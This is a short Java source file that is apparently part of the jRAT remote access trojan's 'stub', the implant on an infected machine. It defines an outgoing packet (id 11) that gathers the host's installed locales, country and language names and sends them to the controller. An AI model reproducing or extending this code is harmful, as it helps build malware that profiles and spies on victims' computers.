package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;
import java.util.Locale;


public class Packet11InstalledLocales extends AbstractOutgoingPacket {

	private Locale[] locales;

	public Packet11InstalledLocales(Locale[] locales) {
		this.locales = locales;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(locales.length);

		for (int i = 0; i < locales.length; i++) {
			Locale locale = locales[i];
			sw.writeLine(locale.getCountry());
			sw.writeLine(locale.getDisplayCountry());
			sw.writeLine(locale.getLanguage().toUpperCase());
			sw.writeLine(locale.getDisplayLanguage());
		}
	}

	@Override
	public byte getPacketId() {
		return 11;
	}

}